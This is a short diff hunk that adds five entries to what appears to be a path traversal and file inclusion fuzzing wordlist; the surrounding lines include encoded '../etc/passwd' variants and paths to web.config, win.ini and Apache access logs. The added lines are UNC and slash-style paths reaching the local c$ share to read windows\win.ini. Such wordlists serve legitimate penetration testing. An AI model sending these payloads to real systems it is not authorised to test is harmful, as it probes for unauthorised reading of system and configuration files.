@@ -10573,6 +10573,11 @@ ZXRjL3NoYWRvdyUwMA==
 \\\%2e%2e%5cetc/passwd
 \\localhost\c$\web.config
 \\localhost\c$\windows\win.ini
+\\127.0.0.1\c$\windows\win.ini
+\\\\127.0.0.1\\c$\windows\\win.ini
+//127.0.0.1/c$/windows/win.ini
+\\\\localhost\\c$\\windows\\win.ini
+//localhost/c$/windows/win.ini
 \\localhost\share\
 \apache2\log\access.log
 \apache2\log\access_log
